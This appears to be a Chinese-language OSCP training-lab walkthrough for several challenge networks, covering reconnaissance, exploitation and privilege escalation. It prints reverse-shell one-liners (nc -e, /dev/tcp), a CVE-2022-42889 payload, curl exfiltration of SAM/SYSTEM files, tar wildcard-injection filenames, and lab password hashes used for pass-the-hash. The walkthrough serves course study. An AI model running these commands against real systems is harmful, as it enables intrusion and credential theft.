b8a04f764ff7a427c31aee6b7d0a5d31f86bfab2dc0579910afd584f0fef6731b454ed7a0a4db00a39b4a8cdffcb50725b9aa9048ea1512c7f6b61979f0b5309d0fe865376f27401396fac46927f7f1e87bff54f1cfbd8acf852765477e1a5cb003c5a3d71e1cd18858e2b29754e611ed5cebba7ba54c7fa03075d0715cf49ed3828b3fe77557195d3c1b52a7df051dbf56504e9692ccb97221350ed38de85fa56e9c4abb95f331ed048f5b1916550700b6b22b98d75930dc46c68ea810d691c115ba67eefbd324d98c5ce66d99a3faa6974d33ebd1a82b14545633b2115324d2e41828efe8d6df621b63feb6533a05e1d3460959c15fb75c76212ef6b687d5661a574f2159b87e5a24742e7cf872701a7dd4ac6e75b6c4e3b0306f7ec95f71570af432119c7d7c26b6833d4f22e78744ad8d39b35db44bea1e0eab25f10ecab34d1907324bb1d0ac4e9d7a2e9b798cedec85f6c37e4394004666be0166287d0b46
```

使用john本地破解得到密码：Dolphin1

![image-20250401184859058](./oscp_pwk.assets/image-20250401184859058.png)

### 10.10.62.148

用该密码连接mssql

```
proxychains4 impacket-mssqlclient sql_svc:Dolphin1@10.10.62.148 -windows-auth
```

![image-20250401185058505](./oscp_pwk.assets/image-20250401185058505.png)

成功连接，权限为sql_svc

开启xp_cmdshell，成功执行命令

```
# 开启xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
执行命令
exec master..xp_cmdshell 'whoami';
```

![image-20250401190335451](./oscp_pwk.assets/image-20250401190335451.png)

这里需要端口转发，通过10.10.62.147转流量，搭建ftp，转发弹shell

![image-20250401210611698](./oscp_pwk.assets/image-20250401210611698.png)

拿到的shell，主机有windows.old目录

![image-20250401210641716](./oscp_pwk.assets/image-20250401210641716.png)

搜索SAM和SYSTEM文件

![image-20250401211329020](./oscp_pwk.assets/image-20250401211329020.png)

上传curl.exe，使用nc配合端口转发，利用miniserve接受文件

```
.\curl.exe -F "path=@C:\windows.old\Windows\System32\SAM" http://10.10.62.147:81/upload?path=/
.\curl.exe -F "path=@C:\windows.old\Windows\System32\SYSTEM" http://10.10.62.147:81/upload?path=/
```

使用pypykatz解密

```
pypykatz registry --sam SAM SYSTEM
```

![image-20250402140918354](./oscp_pwk.assets/image-20250402140918354.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```

### 10.10.62.146

使用tom_admin凭证登录DC即可

```
proxychains4 evil-winrm -i 10.10.62.146 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc
```

![image-20250402142024389](./oscp_pwk.assets/image-20250402142024389.png)

成功登录，拿到proof

![image-20250402142143736](./oscp_pwk.assets/image-20250402142143736.png)

### 192.168.102.149

开放了80http页面，是apache2的默认页面，dirsearch扫描目录也没发现入口点

![image-20250401101212542](./oscp_pwk.assets/image-20250401101212542.png)

那可能在其他端口，使用nc把nmap扫描出来的端口都试试，输入`help`、`version`等等命令测试端口信息

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -sU -T4 192.168.102.149
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-01 12:20 CST
Warning: 192.168.102.149 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.102.149
Host is up (0.0027s latency).
Not shown: 997 closed ports
PORT      STATE         SERVICE
161/udp   open          snmp
22986/udp open|filtered unknown
32778/udp open|filtered sometimes-rpc20

Nmap done: 1 IP address (1 host up) scanned in 1013.59 seconds
```

UDP扫描发现161端口，snmp服务，相关利用方法：https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html

```
snmpwalk -v 2c -c public 192.168.102.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

![image-20250402145231603](./oscp_pwk.assets/image-20250402145231603.png)

命令显示`kiero`密码被重置，可以有理由怀疑kiero密码被还原成了：kiero，尝试登录ssh失败了，ftp成功登录，发现ssh公私钥

![image-20250402150352474](./oscp_pwk.assets/image-20250402150352474.png)

下载到本地，公钥显示私钥是john用户的

![image-20250402150558702](./oscp_pwk.assets/image-20250402150558702.png)

更改私钥权限为700，使用ssh连接，拿到local

![image-20250402150704850](./oscp_pwk.assets/image-20250402150704850.png)

上传linpeas.sh发现可以脏管道提权

![image-20250402152032521](./oscp_pwk.assets/image-20250402152032521.png)

看了下主机有gcc，尝试提权，使用脏管道CVE-2022-0847成功提权root（这题好像脏牛提权也可以

![image-20250402151930576](./oscp_pwk.assets/image-20250402151930576.png)

### 192.168.102.150

开放了8080的http端口

![image-20250401085508145](./oscp_pwk.assets/image-20250401085508145.png)

页面没有明显的指纹信息，只有ico表名是springboot站点，使用dirsearch扫描目录发现`search`和`CHANGELOG`目录

![image-20250401090617925](./oscp_pwk.assets/image-20250401090617925.png)

搜索页面输出的内容找到了一个漏洞：CVE-2022-42889，利用该漏洞尝试反弹shell

```
search?query=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27busybox nc 192.168.45.175 80 -e /bin/sh%27)%7D 
```

成功反弹shell

![image-20250401090455150](./oscp_pwk.assets/image-20250401090455150.png)

拿到local

![image-20250401090729446](./oscp_pwk.assets/image-20250401090729446.png)

主机信息收集发现开放8000常规http端口

![image-20250401091012394](./oscp_pwk.assets/image-20250401091012394.png)

linpeas.sh结果也显示8000存在java应用，是root运行的，命令为：

```
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```

![image-20250401091656159](./oscp_pwk.assets/image-20250401091656159.png)

上传iox搭建隧道，检索漏洞

![image-20250401092517878](./oscp_pwk.assets/image-20250401092517878.png)

但是打了半天没打通，换了个exp：https://github.com/hugsy/jdwp-shellifier

![image-20250401100823838](./oscp_pwk.assets/image-20250401100823838.png)

![image-20250401100834568](./oscp_pwk.assets/image-20250401100834568.png)

![image-20250401100841864](./oscp_pwk.assets/image-20250401100841864.png)

收到root的shell，拿到proof

![image-20250401100928315](./oscp_pwk.assets/image-20250401100928315.png)

### 192.168.102.151

机器开放80http，3389RDP，8021freeswitch-event，首先查看80

![image-20250331211836552](./oscp_pwk.assets/image-20250331211836552.png)

是一个IIS，目录扫描也没有功能点，入口应该不在这里，8021为freeswitch服务，检索漏洞发现存在RCE

![image-20250331212029441](./oscp_pwk.assets/image-20250331212029441.png)

成功RCE，拿到立足点

![image-20250331212132620](./oscp_pwk.assets/image-20250331212132620.png)

先反弹shell，我用的是powershell+base64，拿到local

![image-20250331212530627](./oscp_pwk.assets/image-20250331212530627.png)

`whoami /priv`发现SeImpersonatePrivilege权限

![image-20250331212615147](./oscp_pwk.assets/image-20250331212615147.png)

上传GodPotato成功提权

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.175 80 -e cmd.exe"
```

拿到proof

![image-20250331212907115](./oscp_pwk.assets/image-20250331212907115.png)



## Challenge 6 - OSCP C

> 给了一个MS01的凭证：
>
> **192.168.102.153**
>
> Challenge 6 - MS01 OS Credentials:
> 挑战 6 - MS01 操作系统凭据：
>
> ```
> Eric.Wallows / EricLikesRunning800
> ```

先对给出机器进行信息收集：

```
===========================================192.168.102.155============================================
Nmap scan report for 192.168.102.155
Host is up (0.0024s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
9099/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK 
|     Server: Mobile Mouse Server 
|     Content-Type: text/html 
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp  open  abyss?
35913/tcp open  unknown

===========================================192.168.102.156============================================
Nmap scan report for 192.168.102.156
Host is up (0.0024s latency).
Not shown: 65519 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp          Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.175], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP, 
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-04-06T01:35:49+00:00; +24s from scanner time.
53/tcp   open  domain        ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http          nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3          Dovecot pop3d
|_pop3-capabilities: UIDL CAPA AUTH-RESP-CODE TOP PIPELINING RESP-CODES STLS SASL(PLAIN LOGIN) USER
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap          Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS capabilities STARTTLS IMAP4rev1 listed IDLE SASL-IR LITERAL+ post-login Pre-login ID AUTH=PLAIN AUTH=LOGINA0001 more have OK ENABLE
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
465/tcp  open  ssl/smtp      Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.175], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-04-06T01:34:10+00:00; -1m15s from scanner time.
587/tcp  open  smtp          Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.175], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP, 
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-04-06T01:35:59+00:00; +34s from scanner time.
993/tcp  open  ssl/imap      Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login Pre-login more ID have capabilities OK IMAP4rev1 listed AUTH=PLAIN AUTH=LOGINA0001 IDLE SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3
| fingerprint-strings: 
|   HTTPOptions: 
|     +OK Dovecot (Ubuntu) ready.
|     -ERR Unknown command.
|     -ERR Unknown command.
|   NULL: 
|_    +OK Dovecot (Ubuntu) ready.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
2525/tcp open  smtp          Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.175], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP, 
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-04-06T01:37:23+00:00; +1m58s from scanner time.
3306/tcp open  mysql         MySQL 5.7.40-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 7
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, LongColumnFlag, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, LongPassword, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsCompression, InteractiveClient, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: &{<\x16},M\x0CX_tz;DIKjip\x0E
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http          Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-title: oscp.exam &mdash; Coming Soon
8083/tcp open  http          nginx
|_http-title: Did not follow redirect to https://192.168.102.156:8083/
8443/tcp open  ssl/https-alt Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-title: Apache2 Ubuntu Default Page: It works

===========================================192.168.102.157============================================
Nmap scan report for 192.168.102.157
Host is up (0.0022s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-server-header: MiniServ/1.820
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
```

### 192.168.102.153/10.10.62.153

经过简单端口扫描，机器开启22ssh，使用题目给出凭证连接即可：

```
ssh 'Eric.Wallows'@192.168.102.153
```

![image-20250406093605359](./oscp_pwk.assets/image-20250406093605359.png)

成功连接，是一台双网卡主机

查看目录发现`admintool.exe`工具，尝试运行发现会对比密码

![image-20250406095741218](./oscp_pwk.assets/image-20250406095741218.png)

179379cb0fc81ec454606fee56daa46e正好是我输入密码(EricLikesRunning800)的md5，程序和05f8ba9f047f799adbea95a16de2ef5d做了比较发现不一样退出程序了，使用cmd5解密这个即可

![image-20250406095845342](./oscp_pwk.assets/image-20250406095845342.png)

拿到密码：December31，在尝试运行软件，成功通过验证

![image-20250406095953025](./oscp_pwk.assets/image-20250406095953025.png)

使用该密码ssh登录administrator账户成功

![image-20250406100427311](./oscp_pwk.assets/image-20250406100427311.png)

最后上传mimikatz转存hash，上传fscan对域内进行信息收集

### 域内信息收集

| IP           | Port                                                  |
| ------------ | ----------------------------------------------------- |
| 10.10.62.152 | 53,88,135,139,389,445,465,593,636,3268,3269,5985,9389 |
| 10.10.62.154 | 135,139,445,1433,5040,5985                            |

使用代理隧道用impacket-GetUserSPNs像域控请求票据发现有sql_svc和web_svc，154靶机开启1433，那大概率用的是sql_svc（不是![image-20250406101232910](./oscp_pwk.assets/image-20250406101232910.png)保存到本地使用john破解hash，我两个用户一起爆的，只出来了一个

![image-20250406101701516](./oscp_pwk.assets/image-20250406101701516.png)

查看主机历史命令，还发现了一个凭证：hghgib6vHT3bVWf（这个是后面才发现的

![image-20250406105807585](./oscp_pwk.assets/image-20250406105807585.png)

### 10.10.62.154

使用web_svc登录154的mssql（sql_svc失败了，密码没出来应该

```
proxychains4 impacket-mssqlclient web_svc:Diamond1@10.10.62.154 -windows-auth
```

![image-20250406102246839](./oscp_pwk.assets/image-20250406102246839.png)

看了下库名都是默认的，没有一眼顶针的

![image-20250406103358227](./oscp_pwk.assets/image-20250406103358227.png)

尝试开启xp_cmdshell，也失败了（web_svc用户，回去再看下153

通过历史命令发现一个密码：hghgib6vHT3bVWf，尝试administrator登录154成功

![image-20250406110230836](./oscp_pwk.assets/image-20250406110230836.png)

根目录有windows.old文件，那就跟之前一样了

![image-20250406110419318](./oscp_pwk.assets/image-20250406110419318.png)

上传curl.exe转存SYSTEM和SAM文件（这里由于主机不出网，需要利用frp搭建隧道传输

![image-20250406110958261](./oscp_pwk.assets/image-20250406110958261.png)

然后攻击机利用miniserve接收即可

![image-20250406111146743](./oscp_pwk.assets/image-20250406111146743.png)

使用pypykatz解密即可

```
pypykatz registry --sam SAM SYSTEM
```

![image-20250406111227450](./oscp_pwk.assets/image-20250406111227450.png)

然后pth到DC即可

### 10.10.62.152

pth拿到proof

```
proxychains4 evil-winrm -i 10.10.62.152 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc
```

![image-20250406111405175](./oscp_pwk.assets/image-20250406111405175.png)

### 192.168.102.155

nmap扫描显示开放80http，9099/9999/35913tcp端口，先看下http、

80是一个iis，目录扫描也没有入口点，可以排除掉

![image-20250406111939016](./oscp_pwk.assets/image-20250406111939016.png)

对9099和9999UDP扫描看看

![image-20250406112509380](./oscp_pwk.assets/image-20250406112509380.png)

那就可以确定

9099是tcp端口，运行服务为Mobile Mouse Server

9999是udp端口，运行服务为distinct

Mobile Mouse Server检索到了RCE漏洞，可以先试试：https://github.com/blue0x1/mobilemouse-exploit

运行exp（我把exp的端口改成了90，默认的8080也行

```
python3 CVE-2023-31902.py --target 192.168.102.155 --lhost 192.168.45.175 --file revshell.exe
```

![image-20250406121948061](./oscp_pwk.assets/image-20250406121948061.png)

![image-20250406121954461](./oscp_pwk.assets/image-20250406121954461.png)

收到shell

![image-20250406121917353](./oscp_pwk.assets/image-20250406121917353.png)

拿到local

![image-20250406122120213](./oscp_pwk.assets/image-20250406122120213.png)

上传winPEASany.exe，发现GPGService.exe的二进制文件可以被提权

![image-20250406132438684](./oscp_pwk.assets/image-20250406132438684.png)

icacls也显示有可写权限

```
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
```

![image-20250406132615380](./oscp_pwk.assets/image-20250406132615380.png)

上传revshell.exe并修改为GPGService.exe放到`C:\Program Files\MilleGPG5\`目录

![image-20250406132912249](./oscp_pwk.assets/image-20250406132912249.png)

重启系统，监听攻击机80端口，拿到proof

![image-20250406133122246](./oscp_pwk.assets/image-20250406133122246.png)

### 192.168.102.156

这题机器开放端口非常多，很多跟邮件有关

80端口经过目录扫描发现功能点

![image-20250406113512693](./oscp_pwk.assets/image-20250406113512693.png)

8083也有功能点

![image-20250406113529979](./oscp_pwk.assets/image-20250406113529979.png)

没有明显的入口，使用UDP扫描（这里看了wp

![image-20250406141323540](./oscp_pwk.assets/image-20250406141323540.png)

发现161SNMP端口，在上一个挑战遇见过

```
snmpwalk -v 2c -c public 192.168.102.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

![image-20250406141432740](./oscp_pwk.assets/image-20250406141432740.png)

snmpwalk发现jack用户的凭证：jack:3PUKsX98BMupBiCf

使用该凭证成功登录8083 VESTA应用

![image-20250406141533385](./oscp_pwk.assets/image-20250406141533385.png)

在cron这里创建反弹shell的计划任务

![image-20250406141910358](./oscp_pwk.assets/image-20250406141910358.png)

成功反弹shell，无权限`cat local.txt`

![image-20250406142027686](./oscp_pwk.assets/image-20250406142027686.png)

检索漏洞发现Vesta存在一个本地提权漏洞(这里也看了wp，实在没提权点了)：https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/

按照文章上传三个py并运行即可获得root shell

![image-20250406145842260](./oscp_pwk.assets/image-20250406145842260.png)

拿到local和proof

![image-20250406145933663](./oscp_pwk.assets/image-20250406145933663.png)





```
certutil -split -urlcache -f http://192.168.45.175/nc.exe nc.exe
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
```



### 192.168.102.157

21ftp存在匿名访问，有backup文件

是一堆pdf，先下载到本地

![image-20250406115011969](./oscp_pwk.assets/image-20250406115011969.png)

在20000https端口应用有一个需要认证的RCE，认证信息很可能就在这些PDF中（因为80端口啥都没有

![image-20250406115544706](./oscp_pwk.assets/image-20250406115544706.png)

那一堆PDF翻来翻去也没啥东西，看了眼WP需要用exiftool提取图像元数据（CTF味很重了

提取作者信息

![image-20250406153417146](./oscp_pwk.assets/image-20250406153417146.png)

尝试组合登录，这里用cassie/cassie成功登录系统（还得是小写......

左下角有终端直接点开就行，不用exp

![image-20250406153607826](./oscp_pwk.assets/image-20250406153607826.png)

反弹shell，拿到local（web端的shell考试不认

![image-20250406153715107](./oscp_pwk.assets/image-20250406153715107.png)

上传pspy32s发现有计划文物在备份文件，但是具体目录不知道

![image-20250406155938866](./oscp_pwk.assets/image-20250406155938866.png)

可以去查看系统日志寻找

```
grep "CRON" /var/log/syslog
```

![image-20250406160040015](./oscp_pwk.assets/image-20250406160040015.png)

root身份备份/opt/admin下所有目录，重点是后面的`tar -zxf /tmp/backup.tar.gz *`

GTFO搜到的tar提权命令如下

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

计划任务是root运行的就剩去了sudo，那就需要修改/opt/admin下文件的名字分为`--checkpoint=1`，`--checkpoint-action=exec=sh 1.sh`

然后要创建一个1.sh写入反弹shell的命令

```
echo '#!/bin/bash' > 1.sh
echo 'bash -i >& /dev/tcp/192.168.45.175/80 0>&1' >> 1.sh
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh 1.sh'
```

![image-20250406161035105](./oscp_pwk.assets/image-20250406161035105.png)

监听端口拿到root shell

![image-20250406161012705](./oscp_pwk.assets/image-20250406161012705.png)

拿到proof

![image-20250406161104413](./oscp_pwk.assets/image-20250406161104413.png)

这题还有一个办法，不用反弹shell

> 这里chmod的数字区别如下：
>
> **4755：提权专用，较安全**
> **4777：提权 + 全人开放，危险**
> **7777：全权限+提权+组提权+粘滞，地狱模式👹**

```
echo '#!/bin/bash' > 1.sh
echo '/bin/chmod 4755 /bin/bash' >> 1.sh
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh 1.sh'
然后
/bin/bash -p
即可获得#，也就是root权限
```



## Challenge 7 - Zeus

> 您被指派对宙斯公司网络进行模拟攻击。Active Directory 环境中存在多个漏洞和配置错误，攻击者可以利用这些漏洞获取对所有工作站的访问权限。最终目标是域控制器。
> 尽管这个挑战实验室不是一个模拟考试，但它已经设置为使用类似于 OSCP+考试中的“假设入侵”场景。以下凭证可用于开始您的攻击：用户名：Eric.Wallows 密码：EricLikesRunning800

> 题目给出凭证
>
> **192.168.102.159**
>
> Challenge7 - VM 2 OS Credentials:
> 挑战 7 - 虚拟机 2 操作系统凭证：
>
> ```
> Eric.Wallows / EricLikesRunning800
> ```

```
===============================================192.168.102.158======================================
Nmap scan report for 192.168.102.158
Host is up (0.0030s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-06 12:47:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: zeus.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.
| Subject Alternative Name: DNS:DC01.
| Not valid before: 2025-02-20T19:50:03
|_Not valid after:  2026-02-20T20:10:03
|_ssl-date: 2025-04-06T12:51:26+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zeus.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.
| Subject Alternative Name: DNS:DC01.
| Not valid before: 2025-02-20T19:50:03
|_Not valid after:  2026-02-20T20:10:03
|_ssl-date: 2025-04-06T12:51:26+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server  15.00.2000.00
| ms-sql-ntlm-info: 
|   Target_Name: zeus
|   NetBIOS_Domain_Name: zeus
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: zeus.corp
|   DNS_Computer_Name: DC01.zeus.corp
|   DNS_Tree_Name: zeus.corp
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-20T20:02:12
|_Not valid after:  2055-02-20T20:02:12
|_ssl-date: 2025-04-06T12:51:26+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zeus.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.
| Subject Alternative Name: DNS:DC01.
| Not valid before: 2025-02-20T19:50:03
|_Not valid after:  2026-02-20T20:10:03
|_ssl-date: 2025-04-06T12:51:26+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zeus.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.
| Subject Alternative Name: DNS:DC01.
| Not valid before: 2025-02-20T19:50:03
|_Not valid after:  2026-02-20T20:10:03
|_ssl-date: 2025-04-06T12:51:26+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
55288/tcp open  msrpc         Microsoft Windows RPC
===============================================192.168.102.159======================================
Nmap scan report for 192.168.102.159
Host is up (0.0028s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
